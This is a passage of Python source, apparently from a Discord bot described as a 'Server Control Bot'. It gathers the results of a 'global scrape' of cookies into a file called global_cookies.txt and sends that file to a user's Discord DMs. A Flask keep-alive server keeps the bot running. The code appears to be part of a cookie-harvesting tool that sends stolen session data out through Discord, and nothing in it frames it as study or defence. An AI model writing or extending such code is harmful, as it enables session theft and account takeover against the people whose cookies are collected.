        all_cookies_content = "\n\n".join(unique_cookies_list) if unique_cookies_list else "No cookies found."
        file = discord.File(io.BytesIO(all_cookies_content.encode('utf-8')), filename='global_cookies.txt')
        await dm_channel.send(content="📄 **Global Cookie Results:**", file=file)
        
        await interaction.followup.send("<a:Lightning:1542199575257813135> Global scrape complete! Check your DMs.", ephemeral=True)
    except Exception as e:
        logger.error(f"Failed to send DM: {e}")
        await interaction.followup.send("Global scrape complete, but failed to send DM.", ephemeral=True)


app = Flask('')

@app.route('/')
def home():
    return "I'm alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

Thread(target=run).start()

if __name__ == "__main__":
    if not BOT_TOKEN:
        logger.error("DISCORD_TOKEN not found in environment variables")
        exit(1)

    logger.info("Starting Server Control Bot...")
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        logger.error(f"Failed to start: {e}")
